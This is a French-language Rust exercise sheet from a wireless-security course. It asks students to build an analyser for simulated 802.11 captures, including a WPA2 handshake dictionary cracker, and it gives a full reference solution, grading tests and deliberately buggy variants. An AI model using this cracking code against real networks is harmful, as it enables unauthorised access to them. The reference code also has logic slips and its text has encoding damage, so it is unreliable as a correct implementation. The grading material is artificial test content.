# Exercice 3.2.12 : airwave_hunter

**Module :**
3.2.7 ‚Äî Wireless Security

**Concept :**
a ‚Äî Wireless Security Analyzer (802.11, WPA, Handshakes, PMKID)

**Difficulte :**
‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ‚òÜ (8/10)

**Type :**
complet

**Tiers :**
2 ‚Äî Melange (concepts a + b + c + d + e + f + g + h)

**Langage :**
Rust Edition 2024

**Prerequis :**
- 3.2.3 (Traffic Analysis)
- Understanding of cryptographic concepts
- Basic knowledge of wireless networking

**Domaines :**
Net, Crypto, Algo

**Duree estimee :**
6-8 heures

**XP Base :**
400

**Complexite :**
T3 O(n √ó k) √ó S2 O(n)

---

## üìê SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :** `airwave_hunter.rs`

**Fonctions autorisees :**
- `std::collections::*`
- `sha1::*`, `hmac::*`, `pbkdf2::*`
- `serde::*`
- `hex::*`
- Fonctions mathematiques standard

**Fonctions interdites :**
- Bibliotheques d'acces hardware wireless
- `std::process::Command`
- Acces reseau reel

---

### 1.2 Consigne

**üéÆ CONTEXTE : "Serial Experiments Lain" - The Wired Protocol**

*"Dans l'univers de Lain, le 'Wired' est une couche invisible qui connecte toutes les consciences. Les protocoles wireless 802.11 sont les portails vers ce monde parallele.*

*Tu es un 'Knight' du Wired, charge d'analyser les signaux qui traversent l'ether. Chaque beacon est une invitation, chaque handshake une negociation secrete. Tu dois decoder ces echanges, identifier les failles dans les protocoles, et parfois... briser les cles qui protegent les secrets.*

*'No matter where you are, everyone is always connected.' - Mais certaines connexions ne devraient pas exister."*

---

### 1.2.1 Contexte Academique

Les reseaux wireless utilisent differents protocoles de securite :

1. **WEP** : Obsolete, cle RC4, vulnerable (injection IV, attaque FMS)
2. **WPA/WPA2-PSK** : Pre-Shared Key, 4-way handshake, PBKDF2
3. **WPA2-Enterprise** : 802.1X, serveur RADIUS, certificats
4. **WPA3** : SAE (Simultaneous Authentication of Equals), resistant aux attaques offline

---

**Ta mission :**

Implementer `airwave_hunter` qui:

1. **Parse des frames 802.11** simulees (format JSON)
2. **Identifie les types de frames** (management, control, data)
3. **Detecte les handshakes WPA** (4 messages EAPOL)
4. **Evalue la securite** des configurations (WEP=critique, WPA3=fort)
5. **Simule une attaque dictionnaire** sur les handshakes captures
6. **Genere des recommandations** de securisation

---

**Entree :**

```json
{
  "capture_config": {
    "channel": 6,
    "duration_seconds": 300,
    "dictionary_path": "rockyou_sample.txt"
  },
  "wireless_frames": [
    {
      "frame_id": "F001",
      "timestamp": "2026-01-10T10:00:00.000Z",
      "frame_type": "management",
      "subtype": "beacon",
      "bssid": "AA:BB:CC:DD:EE:FF",
      "source": "AA:BB:CC:DD:EE:FF",
      "destination": "FF:FF:FF:FF:FF:FF",
      "ssid": "CorporateWiFi",
      "channel": 6,
      "signal_strength": -45,
      "security": {
        "protocol": "WPA2-PSK",
        "cipher": "CCMP",
        "akm": "PSK"
      },
      "capabilities": ["ESS", "Privacy", "ShortPreamble"]
    },
    {
      "frame_id": "F002",
      "timestamp": "2026-01-10T10:00:01.000Z",
      "frame_type": "management",
      "subtype": "probe_request",
      "source": "11:22:33:44:55:66",
      "destination": "FF:FF:FF:FF:FF:FF",
      "ssid": "CorporateWiFi"
    },
    {
      "frame_id": "F003",
      "timestamp": "2026-01-10T10:00:02.000Z",
      "frame_type": "data",
      "subtype": "qos_data",
      "bssid": "AA:BB:CC:DD:EE:FF",
      "source": "11:22:33:44:55:66",
      "destination": "AA:BB:CC:DD:EE:FF",
      "eapol": {
        "message_number": 1,
        "anonce": "a1b2c3d4e5f6...",
        "snonce": null,
        "mic": null,
        "key_data": null
      }
    }
  ],
  "captured_handshakes": [
    {
      "handshake_id": "HS-001",
      "bssid": "AA:BB:CC:DD:EE:FF",
      "client_mac": "11:22:33:44:55:66",
      "ssid": "CorporateWiFi",
      "anonce": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
      "snonce": "6f5e4d3c2b1a6f5e4d3c2b1a6f5e4d3c2b1a6f5e4d3c2b1a6f5e4d3c",
      "mic": "deadbeefcafebabe1234567890abcdef",
      "eapol_frame": "0103007502..."
    }
  ],
  "dictionary": ["password123", "corporate2024", "WiFi@2024", "letmein"]
}
```

---

**Sortie :**

```json
{
  "network_discovery": [
    {
      "bssid": "AA:BB:CC:DD:EE:FF",
      "ssid": "CorporateWiFi",
      "channel": 6,
      "security_protocol": "WPA2-PSK",
      "cipher_suite": "CCMP",
      "signal_strength_avg": -45,
      "clients_observed": ["11:22:33:44:55:66"],
      "first_seen": "2026-01-10T10:00:00.000Z",
      "last_seen": "2026-01-10T10:05:00.000Z",
      "beacon_count": 150,
      "security_assessment": {
        "rating": "medium",
        "score": 65,
        "issues": [
          {
            "issue": "WPA2-PSK vulnerable to offline dictionary attack",
            "severity": "medium",
            "recommendation": "Consider WPA3-SAE or WPA2-Enterprise"
          }
        ]
      }
    }
  ],
  "handshake_analysis": [
    {
      "handshake_id": "HS-001",
      "status": "complete",
      "messages_captured": [1, 2, 3, 4],
      "pmkid_available": false,
      "crack_attempt": {
        "status": "success",
        "password_found": "corporate2024",
        "attempts": 2,
        "time_ms": 150,
        "method": "dictionary"
      }
    }
  ],
  "pmkid_analysis": [
    {
      "bssid": "BB:CC:DD:EE:FF:00",
      "pmkid": "8a7b6c5d4e3f2a1b...",
      "crack_attempt": {
        "status": "failed",
        "attempts": 4,
        "method": "dictionary"
      }
    }
  ],
  "frame_statistics": {
    "total_frames": 1500,
    "management_frames": 800,
    "control_frames": 300,
    "data_frames": 400,
    "beacon_frames": 600,
    "probe_requests": 150,
    "probe_responses": 50,
    "deauth_frames": 0
  },
  "security_recommendations": [
    {
      "network": "CorporateWiFi",
      "priority": "high",
      "recommendation": "Password 'corporate2024' cracked - change immediately",
      "mitre_technique": "T1557.004"
    },
    {
      "network": "CorporateWiFi",
      "priority": "medium",
      "recommendation": "Upgrade to WPA3-SAE for offline attack resistance"
    }
  ]
}
```

---

### 1.3 Prototype

```rust
/// Point d'entree principal
pub fn analyze_wireless_capture(input: &WirelessInput) -> WirelessAnalysis;

/// Parse les frames 802.11
pub fn parse_wireless_frames(frames: &[WirelessFrame]) -> ParsedCapture;

/// Identifie les reseaux depuis les beacons
pub fn discover_networks(frames: &[WirelessFrame]) -> Vec<DiscoveredNetwork>;

/// Extrait et valide les handshakes WPA
pub fn extract_handshakes(frames: &[WirelessFrame]) -> Vec<WpaHandshake>;

/// Verifie si un handshake est complet (4 messages)
pub fn is_handshake_complete(handshake: &WpaHandshake) -> bool;

/// Tente de cracker un handshake avec un dictionnaire
pub fn crack_handshake(
    handshake: &WpaHandshake,
    dictionary: &[String]
) -> CrackResult;

/// Calcule le PMK depuis password + SSID
pub fn derive_pmk(password: &str, ssid: &str) -> [u8; 32];

/// Calcule le PTK depuis PMK + nonces + MACs
pub fn derive_ptk(
    pmk: &[u8; 32],
    anonce: &[u8],
    snonce: &[u8],
    ap_mac: &[u8; 6],
    client_mac: &[u8; 6]
) -> [u8; 64];

/// Verifie le MIC du handshake
pub fn verify_mic(
    ptk: &[u8; 64],
    eapol_frame: &[u8],
    expected_mic: &[u8; 16]
) -> bool;

/// Evalue la securite d'un reseau
pub fn assess_security(network: &DiscoveredNetwork) -> SecurityAssessment;

/// Detecte les attaques PMKID
pub fn extract_pmkid(frames: &[WirelessFrame]) -> Vec<PmkidCapture>;
```

---

## üí° SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 L'attaque PMKID (2018)

Decouverte par hashcat, l'attaque PMKID permet de cracker WPA2 **sans capturer le 4-way handshake complet**. Le PMKID est inclus dans le premier message et contient : `HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)`. Un seul paquet suffit!

### 2.2 WPA3 et Dragonfly

WPA3 utilise le protocole SAE (Dragonfly) qui resiste aux attaques offline. Meme avec un dictionnaire, chaque tentative necessite une interaction avec l'AP. Cependant, des vulnerabilites ont ete trouvees (Dragonblood, 2019).

### 2.3 KRACK Attack (2017)

Key Reinstallation Attack : permet de forcer la reinstallation de cles deja utilisees, causant des nonce reuses. Affecte WPA2 et certaines implementations WPA3.

---

### 2.5 DANS LA VRAIE VIE

| Metier | Utilisation |
|--------|-------------|
| **Wireless Security Auditor** | Teste la securite des reseaux entreprise |
| **Penetration Tester** | Capture handshakes, tente le cracking |
| **SOC Analyst** | Detecte les rogue APs et attaques wireless |
| **Network Administrator** | Configure WPA3-Enterprise, RADIUS |
| **IoT Security Researcher** | Analyse les protocoles wireless IoT |

---

## üñ•Ô∏è SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
airwave_hunter.rs  main.rs  captures/

$ cargo build --release

$ ./target/release/airwave_hunter captures/office.json
Wireless Analysis Complete!

Networks Discovered: 5
- CorporateWiFi (WPA2-PSK) - 3 clients
- Guest-Network (Open) - 12 clients
- IT-Secure (WPA2-Enterprise) - 1 client

Handshakes Captured: 2
- HS-001: CRACKED! Password: corporate2024
- HS-002: Failed (not in dictionary)

PMKID Captures: 1
- PMKID-001: Cracking in progress...

Security Score: 45/100
Critical: 2 | High: 3 | Medium: 5
```

---

## üíÄ SECTION 3.1 : BONUS EXPERT (OPTIONNEL)

**Difficulte Bonus :**
üß† (12/10)

**Recompense :**
XP √ó6

**Time Complexity attendue :**
O(n √ó d) ou d = taille dictionnaire

**Space Complexity attendue :**
O(n)

**Domaines Bonus :**
`Crypto, Probas`

### 3.1.1 Consigne Bonus

**üéÆ "Protocol Seven" - Advanced Wireless Cryptanalysis**

*"Le Protocol Seven est le niveau le plus profond du Wired. Ici, les cles ne sont pas simplement crackees - elles sont predites. Tu dois analyser les patterns de generation, exploiter les faiblesses PRNG, et decoder les secrets caches dans le bruit."*

**Ta mission :**

Implementer `advanced_wireless_analysis` qui:

1. **Rainbow tables** : Pre-calcule les PMK pour SSIDs communs
2. **Pattern analysis** : Detecte les passwords faibles par patterns
3. **Timing attack** : Identifie les vulnerabilites WPA3 Dragonfly
4. **Deauth detection** : Detecte les attaques de deauthentication
5. **Evil twin detection** : Identifie les APs malveillants

**Contraintes :**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  dictionary.len() ‚â§ 10^6                ‚îÇ
‚îÇ  Temps limite : O(n √ó d)                ‚îÇ
‚îÇ  Memoire : O(n) pour rainbow tables     ‚îÇ
‚îÇ  False positives < 0.01%                ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 3.1.2 Prototype Bonus

```rust
/// Analyse avancee avec rainbow tables
pub fn advanced_crack(
    handshakes: &[WpaHandshake],
    rainbow_table: Option<&RainbowTable>
) -> Vec<CrackResult>;

/// Detecte les attaques de deauthentication
pub fn detect_deauth_attack(frames: &[WirelessFrame]) -> Vec<DeauthAttack>;

/// Detecte les Evil Twins
pub fn detect_evil_twin(networks: &[DiscoveredNetwork]) -> Vec<EvilTwinAlert>;

/// Pre-calcule une rainbow table
pub fn build_rainbow_table(
    ssids: &[String],
    passwords: &[String]
) -> RainbowTable;
```

---

## ‚úÖ‚ùå SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test ID | Description | Points |
|---------|-------------|--------|
| `T01` | Parse beacon frames | 10 |
| `T02` | Parse EAPOL frames | 10 |
| `T03` | Identify security protocols | 10 |
| `T04` | Extract complete handshake | 15 |
| `T05` | Detect incomplete handshake | 10 |
| `T06` | Derive PMK correctly | 15 |
| `T07` | Verify MIC correctly | 15 |
| `T08` | Crack password from dictionary | 10 |
| `T09` | Security assessment accurate | 5 |

**Total : 100 points**

---

### 4.3 Solution de reference

```rust
use std::collections::HashMap;
use sha1::{Sha1, Digest};
use hmac::{Hmac, Mac};
use pbkdf2::pbkdf2;

type HmacSha1 = Hmac<Sha1>;

#[derive(Debug, Clone)]
pub struct WirelessFrame {
    pub frame_id: String,
    pub timestamp: String,
    pub frame_type: FrameType,
    pub subtype: String,
    pub bssid: Option<String>,
    pub source: String,
    pub destination: String,
    pub ssid: Option<String>,
    pub channel: Option<u8>,
    pub signal_strength: Option<i32>,
    pub security: Option<SecurityInfo>,
    pub eapol: Option<EapolData>,
}

#[derive(Debug, Clone)]
pub enum FrameType {
    Management,
    Control,
    Data,
}

#[derive(Debug, Clone)]
pub struct SecurityInfo {
    pub protocol: String,
    pub cipher: String,
    pub akm: String,
}

#[derive(Debug, Clone)]
pub struct EapolData {
    pub message_number: u8,
    pub anonce: Option<String>,
    pub snonce: Option<String>,
    pub mic: Option<String>,
    pub key_data: Option<String>,
}

#[derive(Debug, Clone)]
pub struct WpaHandshake {
    pub handshake_id: String,
    pub bssid: String,
    pub client_mac: String,
    pub ssid: String,
    pub anonce: Vec<u8>,
    pub snonce: Vec<u8>,
    pub mic: Vec<u8>,
    pub eapol_frame: Vec<u8>,
    pub messages: Vec<u8>,
}

pub fn discover_networks(frames: &[WirelessFrame]) -> Vec<DiscoveredNetwork> {
    let mut networks: HashMap<String, DiscoveredNetwork> = HashMap::new();

    for frame in frames {
        if frame.subtype == "beacon" {
            if let (Some(ref bssid), Some(ref ssid)) = (&frame.bssid, &frame.ssid) {
                let network = networks.entry(bssid.clone()).or_insert_with(|| {
                    DiscoveredNetwork {
                        bssid: bssid.clone(),
                        ssid: ssid.clone(),
                        channel: frame.channel.unwrap_or(0),
                        security_protocol: frame.security.as_ref()
                            .map(|s| s.protocol.clone())
                            .unwrap_or_else(|| "Open".to_string()),
                        cipher_suite: frame.security.as_ref()
                            .map(|s| s.cipher.clone())
                            .unwrap_or_default(),
                        signal_strengths: Vec::new(),
                        clients: Vec::new(),
                        first_seen: frame.timestamp.clone(),
                        last_seen: frame.timestamp.clone(),
                        beacon_count: 0,
                    }
                });

                network.beacon_count += 1;
                network.last_seen = frame.timestamp.clone();

                if let Some(signal) = frame.signal_strength {
                    network.signal_strengths.push(signal);
                }
            }
        }

        // Track clients (data frames)
        if matches!(frame.frame_type, FrameType::Data) {
            if let Some(ref bssid) = frame.bssid {
                if let Some(network) = networks.get_mut(bssid) {
                    let client = &frame.source;
                    if client != bssid && !network.clients.contains(client) {
                        network.clients.push(client.clone());
                    }
                }
            }
        }
    }

    networks.into_values().collect()
}

pub fn extract_handshakes(frames: &[WirelessFrame]) -> Vec<WpaHandshake> {
    let mut handshakes: HashMap<(String, String), HandshakeBuilder> = HashMap::new();

    for frame in frames {
        if let Some(ref eapol) = frame.eapol {
            if let (Some(ref bssid), Some(ref ssid)) = (&frame.bssid, &frames[0].ssid) {
                let key = (bssid.clone(), frame.source.clone());
                let builder = handshakes.entry(key).or_insert_with(|| {
                    HandshakeBuilder {
                        bssid: bssid.clone(),
                        client_mac: frame.source.clone(),
                        ssid: ssid.clone(),
                        messages: [None; 4],
                        anonce: None,
                        snonce: None,
                        mic: None,
                        eapol_frame: None,
                    }
                });

                let msg_idx = (eapol.message_number - 1) as usize;
                if msg_idx < 4 {
                    builder.messages[msg_idx] = Some(eapol.message_number);

                    // Message 1: AP sends ANonce
                    if eapol.message_number == 1 {
                        if let Some(ref anonce) = eapol.anonce {
                            builder.anonce = Some(hex::decode(anonce).unwrap_or_default());
                        }
                    }

                    // Message 2: Client sends SNonce + MIC
                    if eapol.message_number == 2 {
                        if let Some(ref snonce) = eapol.snonce {
                            builder.snonce = Some(hex::decode(snonce).unwrap_or_default());
                        }
                        if let Some(ref mic) = eapol.mic {
                            builder.mic = Some(hex::decode(mic).unwrap_or_default());
                        }
                    }
                }
            }
        }
    }

    handshakes.into_values()
        .filter_map(|builder| builder.build())
        .collect()
}

impl HandshakeBuilder {
    fn build(self) -> Option<WpaHandshake> {
        let anonce = self.anonce?;
        let snonce = self.snonce?;
        let mic = self.mic?;

        Some(WpaHandshake {
            handshake_id: format!("HS-{}", uuid_simple()),
            bssid: self.bssid,
            client_mac: self.client_mac,
            ssid: self.ssid,
            anonce,
            snonce,
            mic,
            eapol_frame: self.eapol_frame.unwrap_or_default(),
            messages: self.messages.iter()
                .filter_map(|m| *m)
                .collect(),
        })
    }
}

pub fn is_handshake_complete(handshake: &WpaHandshake) -> bool {
    // A complete handshake has all 4 messages
    // But for cracking, we only need messages 1+2 or 2+3
    handshake.messages.len() >= 2 &&
    !handshake.anonce.is_empty() &&
    !handshake.snonce.is_empty() &&
    !handshake.mic.is_empty()
}

pub fn derive_pmk(password: &str, ssid: &str) -> [u8; 32] {
    let mut pmk = [0u8; 32];

    pbkdf2::<Hmac<Sha1>>(
        password.as_bytes(),
        ssid.as_bytes(),
        4096,
        &mut pmk,
    );

    pmk
}

pub fn derive_ptk(
    pmk: &[u8; 32],
    anonce: &[u8],
    snonce: &[u8],
    ap_mac: &[u8; 6],
    client_mac: &[u8; 6]
) -> [u8; 64] {
    // PTK = PRF-512(PMK, "Pairwise key expansion", Min(AA,SA) || Max(AA,SA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))

    let mut data = Vec::new();

    // Sort MACs (lexicographically smaller first)
    if ap_mac < client_mac {
        data.extend_from_slice(ap_mac);
        data.extend_from_slice(client_mac);
    } else {
        data.extend_from_slice(client_mac);
        data.extend_from_slice(ap_mac);
    }

    // Sort Nonces
    if anonce < snonce {
        data.extend_from_slice(anonce);
        data.extend_from_slice(snonce);
    } else {
        data.extend_from_slice(snonce);
        data.extend_from_slice(anonce);
    }

    prf_512(pmk, b"Pairwise key expansion", &data)
}

fn prf_512(key: &[u8], label: &[u8], data: &[u8]) -> [u8; 64] {
    let mut result = [0u8; 64];
    let mut counter = 0u8;

    let mut offset = 0;
    while offset < 64 {
        let mut hmac = HmacSha1::new_from_slice(key).expect("HMAC key error");
        hmac.update(label);
        hmac.update(&[0u8]); // null separator
        hmac.update(data);
        hmac.update(&[counter]);

        let output = hmac.finalize().into_bytes();
        let copy_len = std::cmp::min(20, 64 - offset);
        result[offset..offset + copy_len].copy_from_slice(&output[..copy_len]);

        offset += 20;
        counter += 1;
    }

    result
}

pub fn verify_mic(
    ptk: &[u8; 64],
    eapol_frame: &[u8],
    expected_mic: &[u8]
) -> bool {
    // KCK is first 16 bytes of PTK
    let kck = &ptk[..16];

    // Create EAPOL frame with zeroed MIC field for verification
    let mut frame_copy = eapol_frame.to_vec();

    // MIC is at offset 81-97 in EAPOL frame (depends on frame format)
    // Zero it out for calculation
    if frame_copy.len() > 97 {
        for i in 81..97 {
            frame_copy[i] = 0;
        }
    }

    // Calculate MIC
    let mut hmac = HmacSha1::new_from_slice(kck).expect("HMAC key error");
    hmac.update(&frame_copy);
    let calculated_mic = hmac.finalize().into_bytes();

    // Compare first 16 bytes
    &calculated_mic[..16] == expected_mic
}

pub fn crack_handshake(
    handshake: &WpaHandshake,
    dictionary: &[String]
) -> CrackResult {
    let ap_mac = parse_mac(&handshake.bssid);
    let client_mac = parse_mac(&handshake.client_mac);

    let start_time = std::time::Instant::now();

    for (attempt, password) in dictionary.iter().enumerate() {
        // Derive PMK
        let pmk = derive_pmk(password, &handshake.ssid);

        // Derive PTK
        let ptk = derive_ptk(
            &pmk,
            &handshake.anonce,
            &handshake.snonce,
            &ap_mac,
            &client_mac,
        );

        // Verify MIC
        if verify_mic(&ptk, &handshake.eapol_frame, &handshake.mic) {
            return CrackResult {
                status: CrackStatus::Success,
                password_found: Some(password.clone()),
                attempts: attempt + 1,
                time_ms: start_time.elapsed().as_millis() as u64,
                method: "dictionary".to_string(),
            };
        }
    }

    CrackResult {
        status: CrackStatus::Failed,
        password_found: None,
        attempts: dictionary.len(),
        time_ms: start_time.elapsed().as_millis() as u64,
        method: "dictionary".to_string(),
    }
}

fn parse_mac(mac_str: &str) -> [u8; 6] {
    let bytes: Vec<u8> = mac_str
        .split(':')
        .filter_map(|s| u8::from_str_radix(s, 16).ok())
        .collect();

    let mut result = [0u8; 6];
    if bytes.len() >= 6 {
        result.copy_from_slice(&bytes[..6]);
    }
    result
}

pub fn assess_security(network: &DiscoveredNetwork) -> SecurityAssessment {
    let mut issues = Vec::new();
    let mut score = 100;

    match network.security_protocol.as_str() {
        "Open" => {
            score = 0;
            issues.push(SecurityIssue {
                issue: "Network is open - no encryption".to_string(),
                severity: Severity::Critical,
                recommendation: "Enable WPA3 or WPA2-Enterprise".to_string(),
            });
        },
        "WEP" => {
            score = 10;
            issues.push(SecurityIssue {
                issue: "WEP is broken - can be cracked in minutes".to_string(),
                severity: Severity::Critical,
                recommendation: "Upgrade to WPA3 immediately".to_string(),
            });
        },
        "WPA" | "WPA-PSK" => {
            score = 40;
            issues.push(SecurityIssue {
                issue: "WPA/TKIP is deprecated".to_string(),
                severity: Severity::High,
                recommendation: "Upgrade to WPA2 or WPA3".to_string(),
            });
        },
        "WPA2-PSK" => {
            score = 65;
            issues.push(SecurityIssue {
                issue: "WPA2-PSK vulnerable to offline dictionary attack".to_string(),
                severity: Severity::Medium,
                recommendation: "Consider WPA3-SAE or WPA2-Enterprise".to_string(),
            });
        },
        "WPA2-Enterprise" => {
            score = 85;
            issues.push(SecurityIssue {
                issue: "Ensure RADIUS server uses strong authentication".to_string(),
                severity: Severity::Low,
                recommendation: "Use certificate-based authentication".to_string(),
            });
        },
        "WPA3-SAE" | "WPA3" => {
            score = 95;
            issues.push(SecurityIssue {
                issue: "Check for Dragonblood vulnerabilities".to_string(),
                severity: Severity::Info,
                recommendation: "Keep firmware updated".to_string(),
            });
        },
        _ => {
            score = 50;
            issues.push(SecurityIssue {
                issue: format!("Unknown security protocol: {}", network.security_protocol),
                severity: Severity::Medium,
                recommendation: "Verify security configuration".to_string(),
            });
        }
    }

    // Check cipher suite
    if network.cipher_suite == "TKIP" {
        score = score.saturating_sub(20);
        issues.push(SecurityIssue {
            issue: "TKIP cipher is weak".to_string(),
            severity: Severity::High,
            recommendation: "Use CCMP (AES) instead".to_string(),
        });
    }

    let rating = match score {
        0..=20 => "critical".to_string(),
        21..=40 => "poor".to_string(),
        41..=60 => "fair".to_string(),
        61..=80 => "medium".to_string(),
        81..=95 => "good".to_string(),
        _ => "excellent".to_string(),
    };

    SecurityAssessment {
        rating,
        score,
        issues,
    }
}

fn uuid_simple() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let duration = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    format!("{:x}", duration.as_nanos())
}
```

---

### 4.10 Solutions Mutantes

#### Mutant A (Crypto) : Mauvais ordre de concatenation pour PTK

```rust
pub fn derive_ptk(...) -> [u8; 64] {
    let mut data = Vec::new();
    // BUG: Ne trie pas les MACs
    data.extend_from_slice(ap_mac);
    data.extend_from_slice(client_mac);
    // ...
}
// Pourquoi c'est faux : WPA2 requiert un ordre specifique (min/max)
```

#### Mutant B (Crypto) : Mauvais nombre d'iterations PBKDF2

```rust
pub fn derive_pmk(password: &str, ssid: &str) -> [u8; 32] {
    pbkdf2::<Hmac<Sha1>>(
        password.as_bytes(),
        ssid.as_bytes(),
        1000,  // BUG: devrait etre 4096
        &mut pmk,
    );
}
// Pourquoi c'est faux : WPA2 specifie exactement 4096 iterations
```

#### Mutant C (Logic) : Handshake complet mal detecte

```rust
pub fn is_handshake_complete(handshake: &WpaHandshake) -> bool {
    // BUG: Requiert les 4 messages
    handshake.messages.len() == 4
}
// Pourquoi c'est faux : Messages 1+2 ou 2+3 suffisent pour cracker
```

#### Mutant D (Safety) : Parse MAC qui panic

```rust
fn parse_mac(mac_str: &str) -> [u8; 6] {
    let bytes: Vec<u8> = mac_str
        .split(':')
        .map(|s| u8::from_str_radix(s, 16).unwrap())  // BUG: panic!
        .collect();
    // ...
}
// Pourquoi c'est faux : MAC malformee fait crash le programme
```

#### Mutant E (Return) : Security score toujours bon

```rust
pub fn assess_security(network: &DiscoveredNetwork) -> SecurityAssessment {
    // BUG: Retourne toujours score 100
    SecurityAssessment {
        rating: "excellent".to_string(),
        score: 100,
        issues: vec![],
    }
}
// Pourquoi c'est faux : Ignore les problemes de securite reels
```

---

## üß† SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **802.11 Frame Types** : Management, Control, Data
2. **WPA2 Key Hierarchy** : PMK ‚Üí PTK ‚Üí temporal keys
3. **4-Way Handshake** : Echange cryptographique WPA2
4. **PBKDF2** : Derivation de cle a partir du mot de passe
5. **MIC Verification** : Authentification des messages

### 5.2 LDA ‚Äî Traduction litterale

```
FONCTION crack_handshake QUI RETOURNE UN R√âSULTAT ET PREND EN PARAM√àTRES handshake ET dictionary
D√âBUT FONCTION
    D√âCLARER ap_mac COMME TABLEAU DE 6 OCTETS DEPUIS parse_mac(handshake.bssid)
    D√âCLARER client_mac COMME TABLEAU DE 6 OCTETS DEPUIS parse_mac(handshake.client_mac)

    POUR CHAQUE password DANS dictionary FAIRE
        D√âCLARER pmk COMME R√âSULTAT DE derive_pmk(password, handshake.ssid)
        D√âCLARER ptk COMME R√âSULTAT DE derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)

        SI verify_mic(ptk, eapol_frame, expected_mic) EST VRAI ALORS
            RETOURNER SUCC√àS AVEC password
        FIN SI
    FIN POUR

    RETOURNER √âCHEC
FIN FONCTION
```

### 5.3 Visualisation ASCII

```
WPA2 4-WAY HANDSHAKE
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 CLIENT (STA)                                  ACCESS POINT (AP)
      ‚îÇ                                              ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îÇ
      ‚îÇ         ‚îÇ Both have: PMK (from PSK)    ‚îÇ     ‚îÇ
      ‚îÇ         ‚îÇ PMK = PBKDF2(password, SSID, ‚îÇ     ‚îÇ
      ‚îÇ         ‚îÇ            4096, 256)        ‚îÇ     ‚îÇ
      ‚îÇ         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Message 1 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ
      ‚îÇ        ANonce (random 32 bytes)             ‚îÇ
      ‚îÇ        AP ‚Üí STA                             ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îÇ
      ‚îÇ  ‚îÇ STA calculates:                     ‚îÇ     ‚îÇ
      ‚îÇ  ‚îÇ - Generate SNonce                   ‚îÇ     ‚îÇ
      ‚îÇ  ‚îÇ - PTK = PRF(PMK, ANonce || SNonce   ‚îÇ     ‚îÇ
      ‚îÇ  ‚îÇ           || AP_MAC || STA_MAC)     ‚îÇ     ‚îÇ
      ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îÇ
      ‚îÇ                                              ‚îÇ
